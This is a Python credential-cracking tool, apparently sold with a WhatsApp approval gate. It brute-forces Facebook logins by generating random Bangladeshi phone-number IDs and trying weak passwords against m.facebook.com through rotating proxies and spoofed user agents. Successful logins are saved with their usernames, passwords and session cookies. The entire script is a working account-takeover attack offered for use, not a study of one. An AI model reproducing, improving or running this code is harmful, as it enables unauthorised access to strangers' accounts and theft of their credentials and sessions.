import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
  \033[38;5;46m╔══════════════════════════════════════════════════╗  
  \033[38;5;46m║
███████  ██████  ██   ██ ███████ ██      
██      ██    ██ ██   ██ ██      ██      
███████ ██    ██ ███████ █████   ██      
     ██ ██    ██ ██   ██ ██      ██      
███████  ██████  ██   ██ ███████ ███████ 
                                                                              
  \033[38;5;46m╚══════════════════════════════════════════════════╝
\033[32;1m╔═════════════════════════════════════╗
\033[32;1m╠══[\033[1;37m𝐀𝐔𝐓𝐇𝐎𝐑_________\033[1;37mSOHEL-𝐕AU          ║
\033[32;1m╠══[\033[1;36m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊______\033[1;36mSoHel RaNa          ║
\033[32;1m╠══[\033[1;38m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏______\033[1;38m 018*******         ║
\033[32;1m╠══[\033[1;39m𝐅𝐑𝐎𝐌___________\033[1;39m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\033[32;1m╠══[\033[35;1m𝐕𝐄𝐑𝐒𝐈𝐎𝐍 _______________\033[32;1m  [0.1]    ║
\033[32;1m╚═════════════════════════════════════╝
\033[31;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━
\033[37;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━
\033[34;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━""")	
logo1 = ("""
  \033[38;5;46m╔══════════════════════════════════════════════════╗  
  \033[38;5;46m║  \033[38;5;46m 
  \033[38;5;46m ███████  ██████  ██   ██ ███████ ██      
  \033[38;5;46m ██      ██    ██ ██   ██ ██      ██      
  \033[38;5;46m ███████ ██    ██ ███████ █████   ██      
 \033[38;5;46m     ██ ██    ██ ██   ██ ██      ██      
 \033[38;5;46m ███████ ██████  ██   ██ ███████ ███████                               
                                         
                                         
                                                                                  
  \033[38;5;46m╚══════════════════════════════════════════════════-╝
\033[32;1m╔═════════════════════════════════════╗
\033[32;1m╠══[\033[1;37m𝐀𝐔?𝐓𝐇𝐎𝐑_________\033[1;37mSOHEL-𝐕AU       ║
\033[32;1m╠══[\033[1;37m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊______\033[1;37mSoHel RaNa  ║
\033[32;1m╠══[\033[1;37m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏______\033[1;37m 018*******    ║
\033[32;1m╠══[\033[1;37m𝐅𝐑𝐎𝐌___________\033[1;37m 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇     ║
\033[32;1m╠═\033[1;37m═[\033[35;1m𝐕𝐄𝐑𝐒𝐈𝐎𝐍 _______________\033[32;1m  [0.1]   
\033[32;1m╚═════════════════════════════════════╝
\033[37;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━
\033[34;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━	
\033[31;1m━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━━═━""")

def mumitx():
	print('==================================================')

def Main():
        os.system("clear")
        print(logo)
        print(" \033[30;1m\r\x1b[1;32m[1] RANDOM CRACK")
        print(" \033[30;1m\r\x1b[1;32m[0] Exit")
        Emran =input("\n\033[38;5;46m [?] Choices : ")
        if Emran in ["1"]:
            fuck()
        if Emran in [" 0", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\r\x1b[1;32m[+] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('\033[38;5;46m[?] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('\033[30;1m\r\x1b[1;32m[+] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('\033[38;5;46m[?] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print('\033[35;1m[+] Total ids: '+tl)
        print("\033[35;1m[+] Your Code: "+code)
        print('\033[35;1m[+] Process has been started')
        print('\033[35;1m[+] Use flight mode for speed up')
        print('==================================================')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print('==================================================')
    print(' [+] Crack process has been completed')
    print(' [+] OK Ids saved in SOHEL-VAU/OK.txt')
    print(' [+] CP Ids saved in SOHEL-VAU/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[𒄬SOHEL-VAU-‣]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '1.7000000476837158',
            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfcZTyj0ciIDqZv1bUM2oE7casGY2XogJu-wXNz5Vx-JSapns7V4e9iygJFxd0GL3g3WXKnIUX_592hAUP1D-BkehEG1Fcyx4USIko94LebhYA&smuh=43717&lh=Ac8TAQaCaO59Z5JLo6o&wtsid=rdr_0wRzjZXdg6KgoRUo9&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"NEXG N6"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"""\033[1;92m[SOHEL-VAU-‣OK] ✅
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/SOHEL-‣/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;pass
SOHEL-VAU-‣-Ok] ✅
Username : {cid}
Password : {ps}
\nCookie : {coki}
""")
                open('/sdcard/SOHEL--‣CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
def superuser():
    UMO="SOHEL-VAU-‣"
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/SOHEL-VAU/Approval-1/blob/main/room.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/S0HEL.1492")
        time.sleep(3.0)
        
        os.system("clear")
        print(logo)
        print("\t\033[30m      [\033[1;32m\033[ First Get Approvel\033[00m\033[1;30m]")
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("")
        print("                Your Key is Not Approved ")
        print("               Copy And Send Key To Admin")
        print ("")
        print (" Your Key : "+UMO+id)
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is Prince sohel.Sir this tool is paid because 100% ok id just now login\"")
        name = input(" Your Name : ")
        os.system(f"espeak \"{name} ,prass Enter to send your key\"")
        print ("")
        input(" Press Enter To Send Key")
        os.system("xdg-open https://wa.me/+8801875281492")
        superuser()               
superuser()
